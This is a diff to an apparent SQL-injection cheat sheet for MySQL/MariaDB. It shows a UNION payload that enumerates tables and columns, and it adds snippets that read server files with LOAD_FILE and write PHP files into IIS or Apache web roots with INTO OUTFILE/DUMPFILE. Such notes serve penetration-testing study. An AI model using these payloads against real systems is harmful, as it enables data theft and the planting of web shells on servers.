@@ -12,3 +12,14 @@
   - column `schema_name` is database name
 Example union injection
 `... union select 1,2,group_concat(concat(table_name, ':', column_name)) from information_schema.columns where schema_name='interesting_db'`
+
+# read or write files with mysql MariaDB database or SQLi
+## read
+`LOAD_FILE('')`
+## write
+at the end of the query
+`INTO OUTFILE 'c:\\inetpub\\wwwroot\\test.php'`
+`INTO OUTFILE '/var/www/html/test.php'`
+`INTO DUMPFILE 'c:\\inetpub\\wwwroot\\test.php'`
+`INTO DUMPFILE '/var/www/html/test.php'`
+
